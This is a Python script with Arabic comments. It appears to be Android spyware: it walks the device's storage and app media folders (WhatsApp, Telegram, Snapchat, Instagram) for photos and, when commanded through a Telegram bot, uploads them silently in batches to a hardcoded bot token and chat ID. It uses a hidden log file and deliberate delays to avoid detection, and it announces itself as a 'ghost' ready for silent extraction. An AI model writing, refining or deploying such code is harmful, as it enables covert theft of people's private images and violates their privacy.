import os
import time
import requests

# معلومات البوت (ثابتة لضمان الاتصال)
BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

# سجل البصمة (مخفي لضمان عدم التكرار)
LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"

def get_sent():
    """تحميل قائمة الملفات المرسلة سابقاً"""
    if not os.path.exists(LOG_FILE): return set()
    try:
        with open(LOG_FILE, "r") as f: 
            return set(f.read().splitlines())
    except: return set()

def save_sent(path):
    """حفظ المسار في السجل لمنع التكرار"""
    try:
        with open(LOG_FILE, "a") as f: 
            f.write(path + "\n")
    except: pass

def send_doc(path):
    """إرسال الصورة كوثيقة (جودة عالية) لتجنب تحويلها لملصق"""
    try:
        with open(path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                data={"chat_id": CHAT_ID}, 
                files={"document": f}, 
                timeout=60
            )
        return r.status_code == 200
    except: return False

def check_for_command():
    """يفحص الأوامر (1 أو M)"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        r = requests.get(url, params={"offset": -1}, timeout=10).json()
        if r.get("result"):
            last_msg = r["result"][-1].get("message", {}).get("text", "")
            if last_msg == "1" or last_msg.upper() == "M":
                return True
    except: pass
    return False

def deep_scan_all():
    """بحث فائق العمق في كافة مجلدات النظام والذاكرة"""
    targets = [
        "/storage/emulated/0/",  # الذاكرة الرئيسية بالكامل
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/WhatsApp/Media",
        "/storage/emulated/0/Android/media",
        "/storage/emulated/0/Telegram",
        "/storage/emulated/0/Snapchat",
        "/storage/emulated/0/Instagram"
    ]
    sent = get_sent()
    found = []
    
    for base in targets:
        if not os.path.exists(base): continue
        for root, dirs, files in os.walk(base):
            low_root = root.lower()
            # استبعاد المجلدات غير الضرورية لسرعة الأداء
            if "cache" in low_root or ".thumbnails" in low_root:
                continue
            
            for file in files:
                ext = file.lower()
                # فلترة الصور فقط (تجنب الملصقات والملفات الأخرى)
                if ext.endswith((".jpg", ".jpeg", ".png")):
                    p = os.path.join(root, file)
                    # منع التكرار: إذا كان الملف غير مرسل وحجمه معقول (أكبر من 10 كيلو لضمان عدم إرسال أيقونات صغيرة)
                    if p not in sent and os.path.getsize(p) > 10240:
                        found.append(p)
    
    # ترتيب: القديم أولاً ثم الجديد (لسحب الأرشيف تدريجياً)
    found.sort(key=os.path.getmtime)
    return found

def main():
    # إشعار البدء (يظهر بعد ضغط الأزرار الثلاثة)
    time.sleep(2)
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "✅ تم تثبيت النظام بنجاح.. الشبح جاهز. أرسل (1) لبدء السحب الصامت."})
    
    while True:
        try:
            if check_for_command():
                photos = deep_scan_all()
                if not photos:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": "📭 لا توجد صور جديدة في الأرشيف حالياً."})
                else:
                    count = 0
                    for p in photos:
                        if count >= 50: break # سحب 50 صورة في كل وجبة
                        if send_doc(p):
                            save_sent(p)
                            count += 1
                            # التأخير المطلوب (2 ثانية بين صورة وصورة) لضمان عدم كشف البوت
                            time.sleep(2) 
                    
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": f"🎯 اكتمل سحب وجبة ({count}) صورة بنجاح. أرسل (1) للمزيد."})
            
            time.sleep(5) # فحص الأوامر كل 5 ثوانٍ
        except:
            time.sleep(10)

if __name__ == "__main__":
    main()
